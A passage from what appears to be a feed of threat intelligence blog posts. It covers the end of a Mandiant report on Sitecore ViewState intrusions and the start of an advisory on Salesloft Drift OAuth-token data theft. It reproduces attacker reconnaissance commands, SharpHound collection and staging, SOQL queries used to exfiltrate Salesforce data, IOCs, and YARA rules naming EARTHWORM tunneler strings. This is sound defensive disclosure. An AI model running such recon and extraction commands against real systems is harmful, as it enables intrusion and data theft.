style=\"vertical-align: baseline;\"> session using a legitimate administrator account. From this session, </span><code style=\"vertical-align: baseline;\">SHARPHOUND</code><span style=\"vertical-align: baseline;\"> , the data collection component for the Active Directory security analysis platform </span><code style=\"vertical-align: baseline;\">BLOODHOUND</code><span style=\"vertical-align: baseline;\">, was downloaded via a browser and saved to </span><code style=\"vertical-align: baseline;\">C:\\Users\\Public\\Music\\sh.exe</code><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">Following the download, the threat actor returned to the </span><code style=\"vertical-align: baseline;\">DWAGENT</code><span style=\"vertical-align: baseline;\"> remote session and executed </span><code style=\"vertical-align: baseline;\">sh.exe</code><span style=\"vertical-align: baseline;\">, performing extensive Active Directory reconnaissance. </span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>sh.exe  -c all</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once the reconnaissance concluded, the threat actor switched back to the </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> session (still using the compromised administrator account) to archive the </span><code style=\"vertical-align: baseline;\">SharpHound</code><span style=\"vertical-align: baseline;\"> output, preparing it for exfiltration.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Program Files\\7-Zip\\7zFM.exe \n\"C:\\Users\\Public\\Music\\&lt;number&gt;_BloodHound.zip\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Accounts Cleanup</span></h4>\n<p><span style=\"vertical-align: baseline;\">With administrator accounts compromised, the earlier created </span><code style=\"vertical-align: baseline;\">asp$</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">sawadmin</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">accounts were removed, signaling a shift to more stable and covert access methods. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Move Laterally</span></h3>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The compromised administrator accounts were used to </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> to other hosts. On these systems, the threat actor executed commands to continue their reconnaissance and deploy </span><code style=\"vertical-align: baseline;\">EARTHWORM</code>. </span></p>\n<p><span style=\"vertical-align: baseline;\">On one host, the threat actor logged in via </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> using a compromised admin account. Under the context of this account, the threat actor then continued to perform internal reconnaissance commands such as:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>quser\nwhoami\nnet user &lt;AdminUser&gt; /domain\nnltest  /DCLIST:&lt;domain&gt;\nnslookup  &lt;domain-controller&gt;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Recommendations</span></h3>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Mandiant recommends following security best practices in ASP.NET, including implementing automated machine key rotation, enabling View State Message Authentication Code (MAC), and encrypting any plaintext secrets within the </span><code><span style=\"vertical-align: baseline;\">web.config</span></code><span style=\"vertical-align: baseline;\"> file. For more details, refer to the following resources</span>:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://learn.microsoft.com/en-us/aspnet/core/security/?view=aspnetcore-9.0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ASP.NET Core security topics</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://learn.microsoft.com/en-us/aspnet/aspnet/overview/web-development-best-practices/what-not-to-do-in-aspnet-and-what-to-do-instead\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">What not to do in ASP.NET, and what to do instead</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://learn.microsoft.com/en-us/sharepoint/security-for-sharepoint-server/improved-asp-net-view-state-security-key-management\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Improved ASP.NET view state security and key management</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/#:~:text=leading%20to%20Godzilla.-,Recommendations,-Microsoft%20Defender%20for\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Code injection attacks using publicly disclosed ASP.NET machine keys</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">For detailed Sitecore remediation instructions, refer to the official Sitecore </span></span><span style=\"text-decoration: underline; vertical-align: baseline;\"><a href=\"https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">advisory SC2025-005</span></a></span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">.</span></span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following indicators of compromise are available in a <a href=\"https://www.virustotal.com/gui/collection/74a0f1ea1c668bfae74fe7975e82babd4cc4dca866ffec5a2aa334eff3c66d91/iocs\" rel=\"noopener\" target=\"_blank\">Google Threat Intelligence (GTI) collection</a> for registered users.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Accounts</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col style=\"width: 21.0997%;\" /><col style=\"width: 78.9921%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Accounts</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">asp$</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Created account</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">sawadmin</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Created account</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">h496883</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Workstation from the source of the RDP connection</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>File-Based</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100px;\"><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">MD5</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA-256</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">117305c6c8222162d7246f842c4bb014</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">a566cceaf9a66332470a978a234a8a8e2bbdd4d6aa43c2c75c25a80b3b744307</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">WEEPSTEEL (Information.dll)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">a39696e95a34a017be1435db7ff139d5</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">EARTHWORM (lfe.ico, ufp.exe, ufp.ico)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">f410d88429b93786b224e489c960bf5c</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">n/a</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Helper.ico, helper.exe</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">&lt;hash varies&gt; </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">&lt;hash varies&gt; </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1.vbs</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">be7e2c6a9a4654b51a16f8b10a2be175</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">n/a</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">main.exe</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">62483e732553c8ba051b792949f3c6d0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">n/a</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GoToken.exe</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">63d22ae0568b760b5e3aabb915313e44</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">61f897ed69646e0509f6802fb2d7c5e88c3e3b93c4ca86942e24d203aa878863</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SharpHound </span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>Network-Based</h4></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>IP</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">130.33.156[.]194:443</span></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">130.33.156[.]194:8080</span></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">103.235.46[.]102:80</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Detections</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google Security Operations Enterprise and Enterprise+ customers can leverage the following product threat detections and content updates to help identify and remediate threats. All detections have been automatically delivered to Google Security Operations tenants within the Mandiant Frontline Threats curated detections ruleset. To leverage these updated rules, access Content Hub and search on any of the strings above, then View and Manage each rule you wish to implement or modify.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Earthworm Tunneling Indicators</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">User Account Created By Web Server Process</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cmd Launching Process From Users Music</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Sharphound Recon</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">User Created With No Password Expiration Execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Discovery of Privileged Permission Groups by Web Server Process</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Recon_WEEPSTEEL_1 {\n    meta:\n    \tauthor = \"Mandiant\"    \n    strings:\n        $v_w = \"&lt;input type=\\\"hidden\\\" name=\\\"__VIEWSTATE\\\" id=\\\"__VIEWSTATE\\\" value=\" wide\n        $v_a = \"&lt;input type=\\\"hidden\\\" name=\\\"__VIEWSTATE\\\" id=\\\"__VIEWSTATE\\\" value=\" \n        $v_b64_w = \"&lt;input type=\\\"hidden\\\" name=\\\"__VIEWSTATE\\\" id=\\\"__VIEWSTATE\\\" value=\" base64wide\n        $v_b64_a = \"&lt;input type=\\\"hidden\\\" name=\\\"__VIEWSTATE\\\" id=\\\"__VIEWSTATE\\\" value=\" base64\n        $s2 = \"Services\\\\Tcpip\\\\Parameters\" wide\n        $s3 = \"GetOperatingSystemInformation\"\n        $s4 = \"GetSystemInformation\"\n        $s5 = \"GetNetworkAdapterInformation\"\n        $s6 = \"GetAllNetworkInterfaces\"\n        $s7 = \"GetIPProperties\"\n        $s8 = \"GetPhysicalAddress\"\n        $s9 = \"GetDomainNameFromRegistry\"\n\n        $c1 = \"Aes\" fullword\n        $c2 = \"CreateEncryptor\" fullword\n        $c3 = \"System.Security.Cryptography\" fullword\n        $c4 = \"ToBase64String\" fullword\n\n        $guid = \"6d5a95da-0ffe-4303-bb2c-39e182335a9f\"\n    condition:\n        uint16(0) == 0x5a4d and \n        (\n            (all of ($c*) and 7 of ($s*)) or\n            ($guid and (any of ($v*)))\n        )\n    }</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Tunneler_EARTHWORM_1 {\n    meta:\n        author = \"Mandiant\"\n    strings:\n    \t$s1 = \"free1.2\"\n\t\t$s2 = \".//xxx ([-options] [values])*\"\n\t\t$s3 = \"You can create a lcx_listen tunnel like this :\"\n\t\t$s4 = \".//ew -s lcx_listen --listenPort 1080 --refPort 8888\"\n\t\t$s8 = \"I_AM_NEW_RC_CMD_SOCK_CLIENT\"\n\t\t$s9 = \"CONFIRM_YOU_ARE_SOCK_TUNNEL\"\n\t\t$s11 = \"lcx_listen\" fullword\n\t\t$s12 = \"call back cmd_socks ok\"\n\t\t$s13 = \"lcx_tran\" fullword\n\t\t$s14 = \"lcx_slave\" fullword\n\t\t$s15 = \"rssocks\" fullword\n\t\t$s16 = \"ssocksd\" fullword\n\t\t$s17 = \"rcsocksd\" fullword\n\n\t\t\n\t\t$marker1= \"earthworm\" nocase ascii wide\n\t\t$marker2 = \"rootkiter\" nocase ascii wide\n\tcondition:\n\t\t((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550) or uint32(0) == 0x464c457f or (uint32(0) == 0xBEBAFECA or uint32(0) == 0xFEEDFACE or uint32(0) == 0xFEEDFACF or uint32(0) == 0xCEFAEDFE)) and \n\t\t(4 of ($s*) or all of ($marker*))\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Acknowledgement</span></h3>\n<p><span style=\"vertical-align: baseline;\">We would like to extend our gratitude to the Sitecore team for their support throughout this investigation. Additionally, we are grateful to Tom Bennett and Nino Isakovic for their assistance with the payload analysis. We also appreciate the valuable input and technical review provided by Richmond Liclican and Tatsuhiko Ito.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Contact Mandiant&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f697daf9ee0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>"}
{"source": "Threat Intelligence", "title": "Widespread Data Theft Targets Salesforce Instances via Salesloft Drift", "link": "https://cloud.google.com/blog/topics/threat-intelligence/data-theft-salesforce-instances-via-salesloft-drift/", "published": "Tue, 26 Aug 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Austin Larsen, Matt Lin, Tyler McLellan, Omar ElAhdan</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3>Update (August 28)</h3>\n<p><span style=\"vertical-align: baseline;\">Based on new information identified by GTIG, the scope of this compromise is not exclusive to the Salesforce integration with Salesloft Drift and impacts other integrations. We now advise all Salesloft Drift customers to</span><strong style=\"vertical-align: baseline;\"> treat any and all authentication tokens stored in or connected to the Drift platform as potentially compromised</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">On August 28, 2025, our investigation confirmed that the actor also compromised OAuth tokens for the \"Drift Email\" integration. On August 9, 2025, a threat actor used these tokens to access email from a very small number of Google Workspace accounts. The only accounts that were potentially accessed were those that had been specifically configured to integrate with Salesloft Drift; the actor would not have been able to access any other accounts on a customer's Workspace domain.</span></p>\n<p><span style=\"vertical-align: baseline;\">In response to these findings and to protect our customers, Google identified the impacted users, revoked the specific OAuth tokens granted to the Drift Email application, and disabled the integration functionality between Google Workspace and Salesloft Drift pending further investigation. We are notifying all impacted Google Workspace administrators. </span></p>\n<p><span style=\"vertical-align: baseline;\">To be clear, there has been no compromise of Google Workspace or Alphabet itself. Google has not been a Salesloft Drift customer, and therefore is not impacted. Any inquiries regarding potential breach impact should be directed to Salesloft or its customers.</span></p>\n<p><span style=\"vertical-align: baseline;\">We recommend organizations take immediate action to review all third-party integrations connected to their Drift instance, revoke and rotate credentials for those applications, and investigate all connected systems for signs of unauthorized access. </span></p>\n<p><span style=\"vertical-align: baseline;\">Salesloft has now engaged Mandiant to assist in their investigation. See Salesloft’s updated </span><a href=\"https://trust.salesloft.com/?uid=Drift%2FSalesforce+Security+Notification\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">advisory</span></a><span style=\"vertical-align: baseline;\"> for more details.</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Introduction</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is issuing an advisory to alert organizations about a widespread data theft campaign, carried out by the actor tracked as UNC6395. Beginning as early as Aug. 8, 2025 through at least Aug. 18, 2025, the actor targeted Salesforce customer instances through compromised OAuth tokens associated with the </span><a href=\"https://www.salesloft.com/platform/drift\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesloft Drift</span></a><span style=\"vertical-align: baseline;\"> third-party application.</span></p>\n<p><span style=\"vertical-align: baseline;\">The actor systematically exported large volumes of data from numerous corporate Salesforce instances. GTIG assesses the primary intent of the threat actor is to harvest credentials. After the data was exfiltrated, the actor searched through the data to look for secrets that could be potentially used to compromise victim environments. GTIG observed UNC6395 targeting sensitive credentials such as Amazon Web Services (AWS) access keys (AKIA), passwords, and Snowflake-related access tokens. UNC6395 demonstrated operational security awareness by deleting query jobs, however logs were not impacted and organizations should still review relevant logs for evidence of data exposure.</span></p>\n<p><span style=\"vertical-align: baseline;\">Based on data available at the time, Salesloft </span><a href=\"https://trust.salesloft.com/?uid=Drift%2FSalesforce+Security+Notification\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">indicated</span></a><span style=\"vertical-align: baseline;\"> that customers that do not integrate with Salesforce are not impacted by this campaign.</span></p>\n<p><span style=\"vertical-align: baseline;\">On Aug. 20, 2025 Salesloft, in collaboration with Salesforce, revoked all active access and refresh tokens with the Drift application. In addition, Salesforce removed the Drift application from the Salesforce AppExchange until further notice pending further investigation. This issue does not stem from a vulnerability within the core Salesforce platform.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG, Salesforce, and Salesloft have notified impacted organizations.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Threat Detail </span></h3>\n<p><span style=\"vertical-align: baseline;\">The threat actor executed queries to retrieve information associated with Salesforce objects such as Cases, Accounts, Users, and Opportunities. For example, the threat actor ran the following sequence of queries to get a unique count from each of the associated Salesforce objects.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SELECT COUNT() FROM Account;\n\nSELECT COUNT() FROM Opportunity;\n\nSELECT COUNT() FROM User;\n\nSELECT COUNT() FROM Case;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Query to Retrieve User Data</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SELECT Id, Username, Email, FirstName, LastName, Name, Title, CompanyName, \nDepartment, Division, Phone, MobilePhone, IsActive, LastLoginDate, \nCreatedDate, LastModifiedDate, TimeZoneSidKey, LocaleSidKey, \nLanguageLocaleKey, EmailEncodingKey \nFROM User \nWHERE IsActive = true\nORDER BY LastLoginDate DESC NULLS LAST \nLIMIT 20</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4>Query to Retrieve Case Data</h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SELECT Id, IsDeleted, MasterRecordId, CaseNumber &lt;snip&gt;\nFROM Case\nLIMIT 10000</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Recommendations</span></h3>\n<p><span style=\"vertical-align: baseline;\">Given GTIG's observations of data exfiltration associated with the campaign, organizations using Salesloft Drift to integrate with third-party platforms (including but not limited to Salesforce) should consider their data compromised and are urged to take immediate remediation steps.</span></p>\n<p><span style=\"vertical-align: baseline;\">Impacted organizations should search for sensitive information and secrets contained within the integrated platforms and take appropriate action, such as revoking API keys, rotating credentials, and performing further investigation to determine if the secrets were abused by the threat actor.</span></p>\n<p><span style=\"text-decoration: underline; vertical-align: baseline;\">Investigate for Compromise and Scan for Exposed Secrets</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Review all third-party integrations associated with an organization's Drift instance (accessible within the Drift Admin settings page).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span 